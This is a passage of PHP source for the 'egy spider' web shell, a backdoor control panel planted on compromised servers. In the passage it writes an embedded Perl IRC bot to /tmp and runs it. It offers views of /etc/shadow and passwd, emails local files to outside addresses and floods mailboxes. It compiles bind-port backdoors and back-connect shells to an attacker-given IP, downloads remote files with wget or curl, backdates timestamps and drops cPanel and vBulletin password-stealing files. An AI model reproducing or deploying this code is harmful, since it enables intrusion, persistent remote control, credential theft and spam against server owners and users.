    my \$nick = \$DCC{\$socket}{nick};
    my \$arquivo = \$DCC{\$socket}{arquivo};
    my \$itime = \$DCC{\$socket}{itime};
    my \$ftime = time;
    my \$status = \$DCC{\$socket}{status};
    \$ftime = \$DCC{\$socket}{ftime} if defined(\$DCC{\$socket}{ftime});

    my \$d_time = \$ftime-\$itime;

    my \$cur_byte = \$DCC{\$socket}{curbyte};
    my \$bytes_total = \$DCC{\$socket}{bytes};

    my \$rate = 0;
    \$rate = (\$cur_byte/1024)/\$d_time if \$cur_byte > 0;
    my \$porcen = (\$cur_byte*100)/\$bytes_total;

    my (\$r_duv, \$p_duv);
    if (\$rate =~ /^(\d+)\.(\d)(\d)(\d)/) {
       \$r_duv = $3; \$r_duv++ if $4 >= 5;
       \$rate = \"$1\.$2\".\"\$r_duv\";
    }
    if (\$porcen =~ /^(\d+)\.(\d)(\d)(\d)/) {
       \$p_duv = $3; \$p_duv++ if $4 >= 5;
       \$porcen = \"$1\.$2\".\"\$p_duv\";
    }
    return(\"\$sock_tipo\",\"\$status\",\"\$nick\",\"\$arquivo\",\"\$bytes_total\", \"\$cur_byte\",\"\$d_time\", \"\$rate\", \"\$porcen\");
  }

  return(0);
}

# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)
sub fixaddr {
    my (\$address) = @_;

    chomp \$address; # just in case, sigh.
    if (\$address =~ /^\d+$/) {
        return inet_ntoa(pack \"N\", \$address);
    } elsif (\$address =~ /^[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}$/) {
        return \$address;
    } elsif (\$address =~ tr/a-zA-Z//) { # Whee! Obfuscation!
        return inet_ntoa(((gethostbyname(\$address))[4])[0]);
    } else {
        return;
    }
}
############################
";
$bot = "/tmp/ircs.pl";
$open = fopen($bot,"w");
fputs($open,$file);
fclose($open);
$cmd="perl $bot";
$cmd2="rm $bot";
system($cmd);
system($cmd2);
$_POST['cmd']="echo \"Now script try connect to ircserver ...\"";

}


if(!isset($_COOKIE[$lang[$language.'_text137']])) {
	$ust_u='';
	if($unix && !$safe_mode){ 
		foreach ($userful as $item) {
			if(which($item)){$ust_u.=$item;} 
		}
	}
	if (@function_exists('apache_get_modules') && @in_array('mod_perl',apache_get_modules())) {$ust_u.=", mod_perl";}
	if (@function_exists('apache_get_modules') && @in_array('mod_include',apache_get_modules())) {$ust_u.=", mod_include(SSI)";}
	if (@function_exists('pcntl_exec')) {$ust_u.=", pcntl_exec";}
	if (@extension_loaded('win32std')) {$ust_u.=", win32std_loaded";}
	if (@extension_loaded('win32service')) {$ust_u.=", win32service_loaded";}
	if (@extension_loaded('ffi')) {$ust_u.=", ffi_loaded";}
	if (@extension_loaded('perl')) {$ust_u.=", perl_loaded";}
	if(substr($ust_u,0,1)==",") {$ust_u[0]="";}
	
	$ust_u = trim($ust_u);
}else {
	$ust_u = trim($_COOKIE[$lang[$language.'_text137']]);
}

if(!isset($_COOKIE[$lang[$language.'_text138']])) {
	$ust_d=''; 
	if($unix && !$safe_mode){ 
		foreach ($danger as $item) {
			if(which($item)){$ust_d.=$item;} 
		}
	}
	if(!$safe_mode){ 
		foreach ($danger as $item) {
			if(ps($item)){$ust_d.=$item;} 
		}
	}
	if (@function_exists('apache_get_modules') && @in_array('mod_security',apache_get_modules())) {$ust_d.=", mod_security";}
	if(substr($ust_d,0,1)==",") {$ust_d[0]="";} 
	
	$ust_d = trim($ust_d);
}else {
	$ust_d = trim($_COOKIE[$lang[$language.'_text138']]);
}

if(!isset($_COOKIE[$lang[$language.'_text142']])) {

	$select_downloaders='<select size="1" name=with>';
	if((!@function_exists('ini_get')) || (@ini_get('allow_url_fopen') && @function_exists('file'))){$select_downloaders .= "<option value=\"fopen\">fopen</option>";$downloader="fopen";}
	if($unix && !$safe_mode){ 
		foreach ($downloaders as $item) {
			if(which($item)){$select_downloaders .= '<option value="'.$item.'">'.$item.'</option>';$downloader.=", $item";} 
		}
	}
	$select_downloaders .= '</select>';
	if(substr($downloader,0,1)==",") {$downloader[0]="";} 
	
	$downloader=trim($downloader);

}


echo $head;
echo '</head>';

echo '<<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#dadada><tr><td bgcolor=#000000 width=120><font face=Comic Sans MS size=1>'.ws(2).'<DIV dir=ltr align=center><p><font style="font-weight: 500" face="Webdings" color="#800000" size="7">!</font></p>'.ws(2).'<DIV dir=ltr align=center><SPAN
style="FILTER: blur(add=1,direction=10,strength=25); HEIGHT: 25px">
<SPAN
style="FONT-SIZE: 15pt; COLOR: white; FONT-FAMILY: Impact">egy spider</P></SPAN></DIV></font></b></font></td><td bgcolor=#000000><font face=tahoma size=1>'.

'</center></font>'.$fe.'</td>'.'<td bgcolor=#333333><font face=#FFFFFF size=-2>';
echo ws(2)."<b>".date ("d-m-Y H:i:s")."</b> Your IP: [<font color=blue>".gethostbyname($_SERVER["REMOTE_ADDR"])."</font>]";
echo " X_FORWARDED_FOR:"; if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){echo "[<font color=red>".$_SERVER['HTTP_X_FORWARDED_FOR']."</font>]";}else{echo "[<font color=green><b>NONE</b></font>]";}
echo " CLIENT_IP: ";if(isset($_SERVER['HTTP_CLIENT_IP'])){echo "[<font color=red>".$_SERVER['HTTP_CLIENT_IP']."</font>]";}else{echo "[<font color=green><b>NONE</b></font>]";}
echo " Server IP: [<font color=blue>".gethostbyname($_SERVER["HTTP_HOST"])."</font>]";

echo "<br>";

echo ws(2)."PHP Version: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: <b>".(($curl_on)?("<font color=red>ON</font>"):("<font color=green>OFF</font>"));
echo "</b>".ws(2);
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=red>ON</font>"; } else { echo "<font color=green>OFF</font>"; }
echo "</b>".ws(2);
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=red>ON</font>";}else{echo "<font color=green>OFF</font>";}
echo "</b>".ws(2);
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=red>ON</font>";}else{echo "<font color=green>OFF</font>";}
echo "</b>".ws(2);
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=red>ON</font>";}else{echo "<font color=green>OFF</font>";}
echo "</b>".ws(2);
echo "MySQLi: <b>";
$mysqli_on = @function_exists('mysqli_connect');
if($mysqli_on){echo "<font color=red>ON</font>";}else{echo "<font color=green>OFF</font>";}
echo "</b>".ws(2);
echo "MSQL: <b>";
$msql_on = @function_exists('msql_connect');
if($msql_on){echo "<font color=red>ON</font>";}else{echo "<font color=green>OFF</font>";}
echo "</b>".ws(2);
echo "SQLite: <b>";
$sqlite_on = @function_exists('sqlite_open');
if($sqlite_on){echo "<font color=red>ON</font>";}else{echo "<font color=green>OFF</font>";}
echo "</b><br>".ws(2);

echo "Safe_Mode: <b>";
echo (($safe_mode)?("<font color=red>ON</font>"):("<font color=green>OFF</font>"));
echo "</b>".ws(2);
echo "Open_Basedir: <b>";
if($open_basedir) { if (''==($df=@ini_get('open_basedir'))) {echo "<font color=red>ini_get disable!</font></b>";}else {echo "<font color=red>$df</font></b>";};}
else {echo "<font color=green>NONE</font></b>";}
echo ws(2)."Safe_Exec_Dir: <b>";
if(@function_exists('ini_get')) { if (''==($df=@ini_get('safe_mode_exec_dir'))) {echo "<font color=red>NONE</font></b>";}else {echo "<font color=green>$df</font></b>";};}
else {echo "<font color=red>ini_get disable!</font></b>";}
echo ws(2)."Safe_Gid: <b>";
if(@function_exists('ini_get')) { if (@ini_get('safe_mode_gid')) {echo "<font color=green>ON</font></b>";}else {echo "<font color=red>OFF</font></b>";};}
else {echo "<font color=red>ini_get disable!</font></b>";}
echo ws(2)."Safe_Include_Dir: <b>";
if(@function_exists('ini_get')) { if (''==($df=@ini_get('safe_mode_include_dir'))) {echo "<font color=red>NONE</font></b>";}else {echo "<font color=green>$df</font></b>";};}
else {echo "<font color=red>ini_get disable!</font></b>";}
echo ws(2)."Sql.safe_mode: <b>";
if(@function_exists('ini_get')) { if (@ini_get('sql.safe_mode')) {echo "<font color=red>ON</font></b>";}else {echo "<font color=green>OFF</font></b>";};}
else {echo "<font color=red>ini_get disable!</font></b>";}

echo "<br>".ws(2);
echo "Disable Functions : <b>";$df='ini_get  disable!';
if((@function_exists('ini_get')) && (''==($df=@ini_get('disable_functions')))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}

if(@function_exists('diskfreespace')){$free = @diskfreespace($dir);}
elseif(@function_exists('disk_free_space')){$free = @disk_free_space($dir);}else{$free = 'Unknown';}
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
echo "<br>".ws(2)."Free Space : <b>".view_size($free)."</b> Total Space: <b>".view_size($all)."</b>";


if($ust_u){echo "<br>".ws(2).$lang[$language.'_text137'].": <font color=blue>".$ust_u."</font>";};

if($ust_d){echo "<br>".ws(2).$lang[$language.'_text138'].": <font color=red>".$ust_d."</font>";};

if($downloader){echo "<br>".ws(2).$lang[$language.'_text142'].": <font color=blue>".$downloader."</font>";};


echo "<br>".ws(2)."</b>";
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?' title=\"".$lang[$language.'_text160']."\"><b>Home</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?egy' title=\"".$lang[$language.'_text159']."\"><b>About EgY SpIdEr</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?news' title=\"".$lang[$language.'_text152']."\"><b>News</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?logout=1' title=\"".$lang[$language.'_text153']."\"><b>Logout</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?tools&act=feedback' title=\"".$lang[$language.'_text180']."\"><b>Feedback & Contact Me </b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?tools&dlink=qindx' title=\"".$lang[$language.'_text154']."\"><b>Quick index </b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?tools&act=massbrowsersploit' title=\"".$lang[$language.'_text155']."\"><b>Mass Code Injection</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?tools&dlink=showsrc' title=\"".$lang[$language.'_text156']."\"><b>File source </b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?tools&dlink=zone' title=\"".$lang[$language.'_text157']."\"><b>Zone-h</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?tools&act=encoder' title=\"".$lang[$language.'_text158']."\"><b>Hash Tools</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?1' title=\"".$lang[$language.'_text46']."\"><b>PhpInfo</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?2' title=\"".$lang[$language.'_text47']."\"><b>Php.Ini</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?3' title=\"".$lang[$language.'_text50']."\"><b>Cpu</b></a> ".$rb;
if(!$unix) {
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?5' title=\"".$lang[$language.'_text50']."\"><b>SystemInfo</b></a> ".$rb;
}else{
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?6' title=\"View syslog.conf\"><b>Syslog</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?7' title=\"View resolv\"><b>Resolv</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?8' title=\"View hosts\"><b>Hosts</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?9' title=\"View shadow\"><b>Shadow</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?10' title=\"".$lang[$language.'_text95']."\"><b>Passwd</b></a> ".$rb; 
}
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?11' title=\"".$lang[$language.'_text48']."\"><b>Tmp</b></a> ".$rb;
echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?12' title=\"".$lang[$language.'_text49']."\"><b>Delete</b></a> ".$rb;

if($unix && !$safe_mode) 
{ 
 echo "<br>".ws(2)."</b>";
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?13' title=\"View procinfo\"><b>Procinfo</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?14' title=\"View proc version\"><b>Version</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?15' title=\"View mem free\"><b>Free</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?16' title=\"View dmesg\"><b>Dmesg</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?17' title=\"View vmstat\"><b>Vmstat</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?18' title=\"View lspci\"><b>lspci</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?19' title=\"View lsdev\"><b>lsdev</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?20' title=\"View interrupts\"><b>Interrupts</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?21' title=\"View realise1\"><b>Realise1</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?22' title=\"View realise2\"><b>Realise2</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?23' title=\"View lsattr -va\"><b>lsattr</b></a> ".$rb;

 echo "<br>".ws(2)."</b>";
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?24' title=\"View w\"><b>W</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?25' title=\"View who\"><b>Who</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?26' title=\"View uptime\"><b>Uptime</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?27' title=\"View last -n 10\"><b>Last</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?28' title=\"View ps -aux\"><b>Ps Aux</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?29' title=\"View service\"><b>Service</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?30' title=\"View ifconfig\"><b>Ifconfig</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?31' title=\"View netstat -a\"><b>Netstat</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?32' title=\"View fstab\"><b>Fstab</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?33' title=\"View fdisk -l\"><b>Fdisk</b></a> ".$rb;
 echo ws(2).$lb." <a href='".$_SERVER['PHP_SELF']."?34' title=\"View df -h\"><b>df -h</b></a> ".$rb;
}

echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>';
echo $font;

if($unix){
echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
echo ws(3).ex('echo $OSTYPE')."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
if(!empty($id)) { echo ws(3).$id."<br>"; }
else if(@function_exists('posix_geteuid') && @function_exists('posix_getegid') && @function_exists('posix_getgrgid') && @function_exists('posix_getpwuid'))
 {
 $euserinfo  = @posix_getpwuid(@posix_geteuid());
 $egroupinfo = @posix_getgrgid(@posix_getegid());
 echo ws(3).'uid='.$euserinfo['uid'].' ( '.$euserinfo['name'].' ) gid='.$egroupinfo['gid'].' ( '.$egroupinfo['name'].' )<br>';
 }
else echo ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>";
echo ws(3).$dir;
echo ws(3).'( '.perms(@fileperms($dir)).' )';
echo "</b></font>";
}
else
{
echo '<font color=blue><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo ws(3).@substr(@php_uname(),0,120)."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
echo ws(3).@getenv("USERNAME")."<br>";
echo ws(3).$dir;
echo "<br></font>";
}
echo "</font>";
echo "</td></tr></table>";


if(!empty($_POST['cmd']) && $_POST['cmd']=="mail")
 {
 $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$_POST['from']."\r\n");
 err(6+$res);
 $_POST['cmd']="";  
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {  
  if($file=moreread($_POST['loc_file'])){ $filedump = $file; }
  else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=""; }
  if(!empty($_POST['cmd'])) 
  {
    $filename = @basename($_POST['loc_file']);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    $attach = array(
                    "name"=>$filename,
                    "type"=>$mime_type,
                    "content"=>$filedump
                   );
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from egy spider shell'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'egy_spider@hotmail.com'; }
    $res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);
    err(6+$res);
    $_POST['cmd']="";                   
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_bomber" && !empty($_POST['mail_flood']) && !empty($_POST['mail_size']))
 {
 for($h=1;$h<=$_POST['mail_flood'];$h++){
  $res = mail($_POST['to'],$_POST['subj'],$_POST['text'].str_repeat(" ", 1024*$_POST['mail_size']),"From: ".$_POST['from']."\r\n");
 }
 err(6+$res);
 $_POST['cmd']="";  
 }
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(@file_exists($_POST['mk_name']) || !morewrite($_POST['mk_name'],'your text here')) { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
       else {
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(@unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(@mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
       }
      else { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(@rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
 }


if(!empty($_POST['cmd']) && $_POST['cmd']=="touch")
{
if(!$_POST['file_name_r'])
 {
  $datar = $_POST['day']." ".$_POST['month']." ".$_POST['year']." ".$_POST['chasi']." hours ".$_POST['minutes']." minutes ".$_POST['second']." seconds";
  $datar = @strtotime($datar);
  @touch($_POST['file_name'],$datar,$datar);}
else{
  @touch($_POST['file_name'],@filemtime($_POST['file_name_r']),@filemtime($_POST['file_name_r']));
}
$_POST['cmd']="";
}


if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
 {
 if(@is_dir($_POST['e_name'])){ err(1,$_POST['e_name']); $_POST['cmd']=""; }
 elseif($file=moreread($_POST['e_name'])) { $filedump = $file; if(!@is_writable($_POST['e_name'])) { $only_read = 1; }; }
 elseif($file=readzlib($_POST['e_name'])) { $filedump = $file; $only_read = 1; } 
 elseif(@file_exists($_POST['e_name'])) {$filedump = 'NONE'; if(!@is_writable($_POST['e_name'])) { $only_read = 1; };}
 else { err(1,$_POST['e_name']); $_POST['cmd']=""; }
 if(!empty($_POST['cmd'])) 
 {
 echo $table_up3;
 echo $font;
 echo "<form name=save_file method=post>";
 echo ws(3)."<b>".$_POST['e_name']."</b>";
 echo "<div align=center><textarea name=e_text cols=121 rows=24>";
 echo @htmlspecialchars($filedump);
 echo "</textarea>";
 echo "<input type=hidden name=e_name value='".$_POST['e_name']."'>";
 echo "<input type=hidden name=dir value='".$dir."'>";
 echo "<input type=hidden name=cmd value=save_file>";
 echo (!empty($only_read)?("<br><br>".$lang[$language.'_text44']):("<br><br><input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \">"));
 echo "</div>";
 echo "</font>";
 echo "</form>";
 echo "</td></tr></table>";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 $mtime = @filemtime($_POST['e_name']);
 if(!@is_writable($_POST['e_name'])) { err(0,$_POST['e_name']); }
 else {
 if($unix) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']);
 morewrite($_POST['e_name'],$_POST['e_text']);
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
 }
 @touch($_POST['e_name'],$mtime,$mtime);
 }
 

if (!empty($_POST['proxy_port'])&&($_POST['use']=="Perl"))
{
 cf($tempdir.'prxpl',$prx_pl);
 $p2=which("perl");
 $blah = ex($p2.' '.$tempdir.'prxpl '.$_POST['proxy_port'].' &');
 @unlink($tempdir.'prxpl');
 $_POST['cmd']="ps -aux | grep prxpl";
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf($tempdir.'bd.c',$port_bind_bd_c);
 $blah = ex('gcc -o '.$tempdir.'bd '.$tempdir.'bd.c');
 @unlink($tempdir.'bd.c');
 $blah = ex($tempdir.'bd '.$_POST['port'].' '.$_POST['bind_pass'].' &');
 @unlink($tempdir.'bd');
 $_POST['cmd']="ps -aux | grep bd";
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf($tempdir.'bdpl',$port_bind_bd_pl);
 $p2=which("perl");
 $blah = ex($p2.' '.$tempdir.'bdpl '.$_POST['port'].' &');
 @unlink($tempdir.'bdpl');
 $_POST['cmd']="ps -aux | grep bdpl";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf($tempdir.'back',$back_connect);
 $p2=which("perl");
 $blah = ex($p2.' '.$tempdir.'back '.$_POST['ip'].' '.$_POST['port'].' &');
 @unlink($tempdir.'back');
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf($tempdir.'back.c',$back_connect_c);
 $blah = ex('gcc -o '.$tempdir.'backc '.$tempdir.'back.c');
 @unlink($tempdir.'back.c');
 $blah = ex($tempdir.'backc '.$_POST['ip'].' '.$_POST['port'].' &');
 @unlink($tempdir.'back');
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf($tempdir.'dp',$datapipe_pl);
 $p2=which("perl");
 $blah = ex($p2.' '.$tempdir.'dp '.$_POST['local_port'].' '.$_POST['remote_host'].' '.$_POST['remote_port'].' &');
 @unlink($tempdir.'dp');
 $_POST['cmd']="ps -aux | grep dp";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf($tempdir.'dpc.c',$datapipe_c);
 $blah = ex('gcc -o '.$tempdir.'dpc '.$tempdir.'dpc.c');
 @unlink($tempdir.'dpc.c');
 $blah = ex($tempdir.'dpc '.$_POST['local_port'].' '.$_POST['remote_port'].' '.$_POST['remote_host'].' &');
 @unlink($tempdir.'dpc');
 $_POST['cmd']="ps -aux | grep dpc";
}

if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']])) { $_POST['cmd'] = $aliases[$_POST['alias']]; }

for($upl=0;$upl<=16;$upl++)
{
 if(!empty($HTTP_POST_FILES['userfile'.$upl]['name'])){
  if(!empty($_POST['new_name']) && ($upl==0)) { $nfn = $_POST['new_name']; }
  else { $nfn = $HTTP_POST_FILES['userfile'.$upl]['name']; }
  @move_uploaded_file($HTTP_POST_FILES['userfile'.$upl]['tmp_name'],$_POST['dir']."/".$nfn)
  or print("<font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES['userfile'.$upl]['name']."</div></font>");
 }
}
if (!empty($_POST['port1']))
{
 cf("bds",$port_bind_bd_cs);
 $blah = ex("chmod 777 bds");
 $blah = ex("./bds ".$_POST['port1']." &");
 $_POST['cmd']="echo \"Now script install backdoor connect to port ";
  }else{
cf("/tmp/bds",$port_bind_bd_cs);
 $blah = ex("chmod 777 bds");
 }
if (!empty($_POST['php_ini1']))
{
 cf("php.ini",$egy_ini);
  $_POST['cmd']=" now  make incloude for file ini.php and add ss and your shell";
 }

 if (!empty($_POST['htacces']))
{
 cf(".htaccess",$htacces);
  $_POST['cmd']="now .htaccess has been add";
 }
  if (!empty($_POST['egy_res']))
{
 cf(".ini.php",$egy_res);
  $_POST['cmd']="now .htaccess has been add";
 }
  if (!empty($_POST['egy_ini']))
{
 cf("ini.php",$egy_ini);
 

  $_POST['cmd']=" http://target.com/ini.php?egy=http://shell.txt? add ss ini.php now  make incloude for file ini.php and add egy and your shell";
 }

 if (!empty($_POST['egy_cp']))
{
 cf("pass_cpanel.php",$egy_cp);
  $_POST['cmd']="cpanel add";
 }

 if (!empty($_POST['egy_vb']))
{
 cf("vb_hacker.php",$egy_vb);
  $_POST['cmd']="Added Following Files .htaccess & ini.php & vb_hacker.php & pass_cpanel.php ";
 }
 
if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']])) { $_POST['cmd'] = $aliases[$_POST['alias']]; }

for($upl=0;$upl<=16;$upl++)
{

}

if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case 'fopen':
 $datafile = @implode("", @file($_POST['rem_file']));
 if($datafile)
  {
   if(!morewrite($_POST['loc_file'],$datafile)){ err(0);};
  }

 $_POST['cmd'] = '';
 break;
 case 'wget':
 $_POST['cmd'] = which('wget')." \"".$_POST['rem_file']."\" -O \"".$_POST['loc_file']."\"";
 break;
 case 'fetch':
 $_POST['cmd'] = which('fetch')." -p \"".$_POST['rem_file']."\" -o \"".$_POST['loc_file']."\"";
 break;
 case 'lynx':
 $_POST['cmd'] = which('lynx')." -source \"".$_POST['rem_file']."\" > \"".$_POST['loc_file']."\"";
 break;
 case 'links':
 $_POST['cmd'] = which('links')." -source \"".$_POST['rem_file']."\" > \"".$_POST['loc_file']."\"";
 break;
 case 'GET':
 $_POST['cmd'] = which('GET')." \"".$_POST['rem_file']."\" > \"".$_POST['loc_file']."\"";
 break;
 case 'curl':
 $_POST['cmd'] = which('curl')." \"".$_POST['rem_file']."\" -o \"".$_POST['loc_file']."\"";
 break;
 }
}
if(!empty($_POST['cmd']) && (($_POST['cmd']=="ftp_file_up") || ($_POST['cmd']=="ftp_file_down")))
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { err(3); }
 else 
  {   
